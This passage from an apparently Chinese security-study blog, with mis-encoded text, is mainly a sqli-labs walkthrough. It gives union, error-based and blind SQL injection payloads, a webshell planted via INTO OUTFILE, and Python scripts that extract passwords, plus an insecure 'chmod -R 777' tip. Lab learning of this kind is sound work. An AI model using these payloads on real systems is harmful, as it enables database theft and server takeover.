src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311200511035.png" alt="image-20210311200511035" style="zoom: 67%;"><p>ä¸Šé¢çš„é”™è¯¯æ˜¯mysqlæ•°æ®åº“çš„å®¹å™¨å…³é—­å¯¼è‡´</p><p>ä½†æ˜¯é‡å¯æ—¶è¿˜æ˜¯ç«‹å³å…³é—­</p><p>æŸ¥çœ‹æ—¥å¿—çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼Œç™¾åº¦è§£å†³</p><pre><code class="hljs vim">root@sunzy-virtual-machine:~# docker logs -<span class="hljs-keyword">f</span> <span class="hljs-number">250</span>c80740b5bWarnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignoredWarnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignoredWarnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignored</code></pre><p>å°†mysqlæ–‡ä»¶å¤¹ä¸­çš„my.cnfçš„æƒé™æ”¹ä¸º 644 </p><pre><code class="hljs apache"><span class="hljs-attribute">chmon</span> <span class="hljs-number">644</span> my.cnf</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311203031485.png" alt="image-20210311203031485"></p><ul><li>ç½‘ç«™çš„å›¾ç‰‡æ— æ³•æ˜¾ç¤ºæˆ–è€…css,jsä»£ç æ— æ³•æ‰§è¡Œ</li></ul><p>è¿›å…¥nginxæœåŠ¡å™¨çš„å®¹å™¨å†…</p><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> å®¹å™¨å bash</code></pre><p>cd è¿›å…¥å›¾ç‰‡æˆ–è€…css jsä»£ç ä¿å­˜çš„æ–‡ä»¶å¤¹</p><p>ä½¿ç”¨chmodæ”¹å˜æƒé™</p><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">777</span> æ–‡ä»¶å¤¹  # -R  å‚æ•°æ˜¯é€’å½’æ”¹å˜æƒé™ å³æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶éƒ½æœ‰<span class="hljs-number">777</span> çš„æƒé™</code></pre><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>æé«˜äº†è‡ªå·±çš„åŠ¨æ‰‹èƒ½åŠ›ï¼Œä»¥åŠç¼–ç¨‹èƒ½åŠ›ï¼ŒåŠ æ·±äº†å¯¹thinkPHPæ¡†æ¶çš„äº†è§£ï¼Œæ˜ç™½äº†å…¶è¿è¡ŒåŸç†ï¼Œå­¦ä¼šäº†å¦‚ä½•ç¼–è¾‘ä¸€ä¸ªCMSç½‘ç«™</li><li>åœ¨ç¼–å†™æ¼æ´çš„è¿‡ç¨‹ä¸­ä¹Ÿæé«˜äº†è‡ªå·±å¯¹æ”¹æ¼æ´çš„ç†è§£ï¼Œåœ¨ä»¥åçš„å­¦ä¹ å’Œå·¥ä½œä¸­èƒ½æ›´å¥½çš„åˆ©ç”¨å’Œé˜²å¾¡æ¼æ´</li><li>é”»ç‚¼äº†è‡ªå·±çš„å­¦ä¹ èƒ½åŠ›ï¼Œä»ä¸€å¼€å§‹çš„æ— ä»ä¸‹æ‰‹ï¼Œåæ¥é€šè¿‡æ‰‹å†Œå­¦ä¹ åï¼Œäº†è§£äº†ç½‘ç«™çš„æ¡†æ¶ï¼Œåˆ°åæ¥å¯ä»¥è‡ªå¦‚çš„ä¿®æ”¹ç½‘ç«™çš„é¡µé¢å’Œåç«¯é€»è¾‘ä»£ç ï¼Œå¯¹è‡ªå·±çš„å­¦ä¹ èƒ½åŠ›æå‡å¾ˆå¤§ï¼Œè¿™ä¹Ÿæ˜¯è¿™é—¨è¯¾ç¨‹çš„é‡è¦æ„ä¹‰ã€‚æ¯•ç«Ÿå­¦ä¹ å®‰å…¨ï¼Œå¾ˆå¤šä¸œè¥¿æ˜¯éœ€è¦è‡ªå·±æ‘¸ç´¢çš„ï¼Œå…·å¤‡ç‹¬ç«‹å­¦ä¹ çš„èƒ½åŠ›æ‰èƒ½åœ¨å®‰å…¨çš„é“è·¯ä¸Šèµ°çš„æ›´è¿œã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>thinkPHP,cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>net_a_and_d</title>
    <link href="/2021/03/03/net-a-and-d/"/>
    <url>/2021/03/03/net-a-and-d/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>getæäº¤å‚æ•°id</p><p>é¦–å…ˆæäº¤<code>1&#39;</code>ï¼Œåˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223925654.png" alt="image-20210130223925654"></p><p>è¿™é‡Œå‡ºç°æŠ¥é”™ï¼Œè¯´æ˜æ˜¯å­—ç¬¦ç±»å‹çš„ï¼Œå¹¶ä¸”æ˜¯ç”¨<code>&#39;</code>å°†å‚æ•°idåŒ…è£¹èµ·æ¥çš„ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­åˆ—æ•°ï¼Œçˆ†è¡¨åï¼Œçˆ†åˆ—åå’Œæ•°æ®åº“å†…å®¹</p><p><strong>0x1 ç¡®å®šåˆ—æ•°å¹¶çˆ†å‡ºè¡¨å</strong></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213104147.png" alt="image-20210130213104147"></p><p>å½“åˆ—æ•°å¢åŠ åˆ°4çš„æ—¶å€™å¼€å§‹æŠ¥é”™ï¼Œè¯´æ˜æ˜¯ä¸‰åˆ—</p><pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()--+</code></pre><p><img src="https://i.loli.net/2021/01/30/KtISlB9Wd4mreqF.png" alt="image-20210130213358017.png"></p><p><strong>0x2 çˆ†åˆ—å</strong></p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+</code></pre><p>è¿™é‡Œçš„åˆ—åå¾ˆå¤š</p><pre><code class="hljs pgsql">user_id,first_name,last_name,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span>,avatar,last_login,failed_login</code></pre><p><strong>0x3 çˆ†å‡ºå†…å®¹</strong></p><p>é€‰æ‹©password</p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213751401.png" alt="image-20210130213751401"></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>åŒæ ·ä½¿ç”¨ <code>id=1&#39;</code>ï¼Œåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹çš„æ³¨å…¥</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214135139.png" alt="image-20210130214135139"></p><p>å¯ä»¥å‘ç°è¾“å…¥çš„<code>&#39;</code>æ²¡æœ‰å…¶ä»–çš„<code>&#39;</code>ä¸ä¹‹é—­åˆï¼Œå¯¼è‡´æŠ¥é”™ï¼Œæ‰€ä»¥è¿™æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨level1çš„æ³¨å…¥è¯­å¥ï¼Œåªéœ€è¦åˆ é™¤ â€˜ å³å¯</p><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+ </span>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+ </span>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>æäº¤<code>id=1&#39;</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214628110.png" alt="image-20210130214628110"></p><p>åˆ†æä¸€ä¸‹æŠ¥é”™åŸå› </p><p>å‡ºé”™çš„è¯­å¥ä¸º</p><pre><code class="hljs 1c">&#x27;1&#x27;&#x27;) LIMIT 0,1</code></pre><p>å…¶ä¸­<strong style="color:orange;">1â€™</strong>è¾“å…¥çš„å†…å®¹ï¼Œæ‰€ä»¥åŒ…è£¹å‚æ•°çš„æ ¼å¼ä¸º<code>(&#39;id&#39;)</code></p><p>æ³¨å…¥è¯­å¥å¯ä»¥ç›´æ¥åœ¨level1çš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ª )å³å¯</p><p>å°†åŸè¯­å¥ä¿®æ”¹ä¸º</p><pre><code class="hljs ada"><span class="hljs-string">&#x27;1&#x27;</span>) æ³¨å…¥è¯­å¥ <span class="hljs-comment">--+ &#x27;) LIMIT 0,1 </span></code></pre><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+ ?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+ ?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users--+</code></pre><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>åŒæ ·è¾“å…¥<code>id=1&#39;</code>ï¼Œä½†æ˜¯è¿™æ¬¡æ²¡æœ‰æŠ¥é”™ï¼Œæ‰æ˜¯æ˜¯ä½¿ç”¨äº†<code>&quot;</code>ï¼Œæ¢æˆ<code>id=1&quot;</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130215456338.png" alt="image-20210130215456338"></p><p>å¾ˆæ˜æ˜¾å’Œlevel3åŸºæœ¬ç›¸åŒï¼Œå°†<code>&#39;</code>æ”¹ä¸º<code>&quot;</code>ï¼Œå°±æ˜¯è¿™å…³çš„ç­”æ¡ˆ</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>è¿™é¢˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä½†æ˜¯ä¸åœ¨å›æ˜¾æ‰€æŸ¥è¯¢çš„å†…å®¹ï¼Œæ‰€ä»¥æ˜¯ç›²æ³¨</p><p>æŸ¥çœ‹æºç ä¹Ÿå¯ä»¥å‘ç°</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130220440238.png" alt="image-20210130220440238" style="zoom:50%;"><p>ä¸åœ¨æ‰“å°å‡ºæ‰€æŸ¥è¯¢åˆ°çš„å†…å®¹ï¼Œæ‰€ä»¥æ˜¯ç›²æ³¨ï¼Œä½†æ˜¯è¿™å…³æ²¡æœ‰å…³é—­æŠ¥é”™å›æ˜¾ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æŠ¥é”™æ³¨å…¥</p><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><p><span style="background-color:yellow"><strong>(1). é€šè¿‡flooræŠ¥é”™</strong></span></p><p>and (select 1 from (select count(<em>),concat((payload) from users limit 0,1),floor (rand(0)</em>2))x from information_schema.tables group by x)a)</p><p>å…¶ä¸­payloadä¸ºä½ è¦æ’å…¥çš„SQLè¯­å¥éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è¯­å¥å°† è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º64ä¸ªå­—ç¬¦</p><p><span style="background-color:yellow"><strong>(2). é€šè¿‡updatexmlæŠ¥é”™</strong></span></p><p>and updatexml(1,payload,1)</p><p>åŒæ ·è¯¥è¯­å¥å¯¹è¾“å‡ºçš„å­—ç¬¦é•¿åº¦ä¹Ÿåšäº†é™åˆ¶ï¼Œå…¶æœ€é•¿è¾“å‡º32ä½å¹¶ä¸”è¯¥è¯­å¥å¯¹payloadçš„åæ‚”ç±»å‹ä¹Ÿåšäº†é™åˆ¶ï¼Œåªæœ‰åœ¨payloadè¿”å›çš„ä¸æ˜¯xmlæ ¼å¼æ‰ä¼šç”Ÿæ•ˆ</p><p><span style="background-color:yellow"><strong>(3). é€šè¿‡ExtractValueæŠ¥é”™</strong></span></p><p>and extractvalue(1, payload)</p><p>è¾“å‡ºå­—ç¬¦æœ‰é•¿åº¦é™åˆ¶ï¼Œæœ€é•¿32ä½ã€‚</p><p><strong>0x1 ç¡®å®šæ•°æ®åº“å</strong></p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x23</span>,database(),<span class="hljs-number">0x23</span>))<span class="hljs-comment">--+</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130221306917.png" alt="image-20210130221306917"></p><p><strong>0x2 çˆ†è¡¨å</strong></p><pre><code class="hljs n1ql">?id=1&#x27; and extractvalue(1,concat(0x23,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x23</span>))--+</code></pre><p>è¿™é‡Œæ¯æ¬¡æŠ¥é”™æ˜¾ç¤ºçš„ä¿¡æ¯åªæœ‰ä¸€è¡Œï¼Œæ‰€ä»¥åªèƒ½æœ‰ limitï¼Œä¸€ä¸ªä¸€ä¸ªçš„æ˜¾ç¤ºï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡è¡¨å</p><p><strong>0x3 çˆ†åˆ—å</strong></p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> extractvalue(1,concat(0x23,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> limit 1,1),0x23))--+</code></pre><p><strong>0x4 çˆ†å†…å®¹</strong></p><pre><code class="hljs mysql">?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+</code></pre><p>åé¢çš„å†…å®¹å¯ä»¥é€šè¿‡æ”¹å˜limitåçš„ç¬¬ä¸€ä¸ªå‚æ•°æŸ¥çœ‹</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>ä¸level5å¾ˆåƒ</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223612822.png" alt="image-20210130223612822"></p><p>ä½†æ˜¯è¿™é‡Œæ˜¯ç”¨ â€œåŒ…è£¹å‚æ•°ï¼Œæ‰€ä»¥åªéœ€è¦å°†ä¸Šé¢çš„æ³¨å…¥è¯­å¥ä¸­çš„ â€˜ æ”¹ä¸º â€œå³å¯</p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>æäº¤id=1ï¼Œå‡ºç°æç¤º</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131230645205.png" alt="image-20210131230645205"></p><p>éœ€è¦ä½¿ç”¨outfileå‡½æ•°</p><p>åœ¨åˆ©ç”¨sqlæ³¨å…¥æ¼æ´åæœŸï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯é€šè¿‡mysqlçš„fileç³»åˆ—å‡½æ•°æ¥è¿›è¡Œè¯»å–æ•æ„Ÿæ–‡ä»¶æˆ–è€…å†™å…¥webshellï¼Œå…¶ä¸­æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°æœ‰ä»¥ä¸‹ä¸‰ä¸ª</p><ul><li>into dumpfile()</li><li>into outfile()</li><li>load_file()</li></ul><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨outfileå‡½æ•°</p><p>é¦–å…ˆç¡®å®šè¿™å…³åŒ…è£¹å‚æ•°çš„æ ¼å¼</p><p>ä¸€ç›´æµ‹è¯•åˆ°<code>id=1&#39;)) --+</code>ï¼Œæ‰æ˜¾ç¤ºæ­£ç¡®æ‰€ä»¥å¯ä»¥ç¡®å®šå‚æ•°çš„åŒ…è£¹æ ¼å¼ä¸º<code>((&#39;id&#39;))</code></p><p><strong>0x1 å‘ç½‘ç«™æ ¹ç›®å½•å†™å…¥ä¸€å¥è¯æœ¨é©¬</strong></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233508732.png" alt="image-20210131233508732"></p><p>æ‰§è¡Œåå°±å¯ä»¥åœ¨æ ¹ç›®å½•ä¸­çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233433411.png" alt="image-20210131233433411"></p><p><strong>0x2 ä½¿ç”¨èšå‰‘è¿æ¥</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">3</span>.phpå¯†ç :cmd</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233415258.png" alt="image-20210131233415258" style="zoom:50%;"><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>æ ¹æ®æ ‡é¢˜å’Œæµ‹è¯•ç»“æœå¯ä»¥çœ‹å‡ºæ˜¯ç›²æ³¨</p><p>é¦–å…ˆåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹æ³¨å…¥</p><p>æäº¤<code>id=1</code>ï¼Œæ˜¾ç¤ºç»“æœä¸º<code>You are in</code>ï¼Œå¯ä»¥ç¡®å®šæˆåŠŸæŸ¥è¯¢è¿”å›çš„ç»“æœ</p><p>æäº¤<code>id=1&#39;</code>ï¼Œæ²¡æœ‰æç¤º<code>You are in</code>ï¼Œä½†æ˜¯æäº¤<code>id=1&#39; --+</code>ï¼Œå†æ¬¡å‡ºç°<code>You are in</code>ï¼Œå¯ä»¥ç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼ŒåŒ…è£¹å½¢å¼ä¸º<code>&#39;id&#39;</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç¡®å®šç›²æ³¨ä½¿ç”¨çš„è¯­å¥ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ <code>ascii</code>å’Œ<code>substring</code>ä¸¤ä¸ªå‡½æ•°</p><p><strong>0x1 çˆ†å‡ºæ•°æ®åº“å</strong></p><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span><span class="hljs-comment">%23</span></code></pre><p>é¦–å…ˆå‡è®¾æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ¯çš„asciiç å€¼å¤§äº97ï¼Œå›æ˜¾ä¸º<code>you are in</code>ï¼Œæ‰€ä»¥ç¡®å®šç¬¬ä¸€ä¸ªå­—æ¯å¤§äº97ï¼Œä¹‹åå¯ä»¥ä½¿ç”¨äºŒåˆ†æ³•ç¡®å®šå‡ºæœ€åçš„å­—æ¯ã€‚</p><p>å¯ä»¥ä½¿ç”¨è„šæœ¬å®Œæˆè¯¥è¿‡ç¨‹ï¼Œè„šæœ¬è·‘å‡ºçš„ç»“æœä¸º  <strong style="color:red;">security</strong></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201120357770.png" alt="image-20210201120357770"></p><p><strong>0x2 çˆ†å‡ºè¡¨å</strong></p><p>ä½¿ç”¨æ³¨å…¥è¯­å¥</p><pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre><p>æœ€åçˆ†å‡ºçš„è¡¨åå¦‚ä¸‹</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201121435085.png" alt></p><p><strong>0x3 çˆ†å‡ºåˆ—å</strong></p><pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201140521465.png" alt="image-20210201140521465"></p><p><strong>0x4 çˆ†å‡ºå†…å®¹</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (select ascii(substring(group_concat(password),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) as a from users having a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201141626668.png" alt="image-20210201141626668"></p><p>å®Œæ•´è„šæœ¬å¦‚ä¸‹</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;</span>flag = <span class="hljs-string">&quot;&quot;</span>t = <span class="hljs-string">&quot;&quot;</span><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment"># payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        response = requests.get(url+payload)        t = response.text        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-comment"># print(mid)</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)    print(flag)print(flag)</code></pre><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>é¢˜ç›®æ ‡é¢˜æç¤ºäº†æ˜¯åŸºäºæ—¶é—´ä¸”å•å¼•å·é—­åˆçš„ç›²æ³¨</p><p>åŸºäºæ—¶é—´çš„ç›²æ³¨éœ€è¦ä½¿ç”¨åˆ°<code>sleep</code>å‡½æ•°ï¼ŒåŸºæœ¬ç”¨æ³•å¦‚ä¸‹</p><p>åˆ†åˆ«æäº¤<code>id=1</code>ï¼Œ<code>id=1&#39; and sleep(3) --+</code>ï¼Œå…¶æœåŠ¡å™¨çš„å“åº”æ—¶é—´å¦‚ä¸‹ï¼Œç¬¬äºŒä¸ªçš„å“åº”æ—¶é—´æ­£å¥½æ¯”ç¬¬ä¸€ä¸ªé•¿äº†ä¸‰ç§’ï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­è‡ªå·±æ‰€æŸ¥è¯¢çš„è¯­å¥æ˜¯å¦æ­£ç¡®ï¼Œä¸€èˆ¬éœ€è¦ç¼–å†™è„šæœ¬å®Œæˆæ‰€æœ‰æ­¥éª¤ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213644564.png" alt="image-20210201213644564"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213715695.png" alt="image-20210201213715695"></p><p>æ³¨å…¥è„šæœ¬åªéœ€è¦æ”¹ä¸€æ”¹level8çš„å³å¯ã€‚</p><p>å®Œæ•´è„šæœ¬å¦‚ä¸‹</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> datetimeurl = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    left = <span class="hljs-number">32</span>    right = <span class="hljs-number">128</span>    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(left &lt; right):        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>        payload = <span class="hljs-string">&quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>        t1 = datetime.datetime.now()        response = requests.get(url+payload)        t2 = datetime.datetime.now()        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)    print(flag)print(flag)</code></pre><p>çˆ†ç ´æ•°æ®åº“åçš„è¿‡ç¨‹å¦‚ä¸‹</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201220840369.png" alt="image-20210201220840369"></p><h2 id="level10"><a href="#level10" class="headerlink" 